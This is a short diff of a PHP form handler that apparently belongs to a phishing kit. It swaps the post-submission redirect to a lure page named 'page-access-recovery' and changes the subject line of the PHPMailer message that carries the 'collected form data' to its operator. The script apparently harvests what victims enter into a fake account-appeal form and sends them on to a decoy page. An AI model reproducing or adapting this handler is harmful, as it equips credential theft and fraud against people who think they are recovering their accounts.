@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://appeal-submit-formuh9unh9u9.vercel.app/");
+header("Location:https://page-access-recovery.netlify.app/confrim.html");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -45,7 +45,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'asif';
+        $mail->Subject = 'shakir1';
         $mail->Body = $emailBody; // Set the email body using the collected form data
         
         // Send email
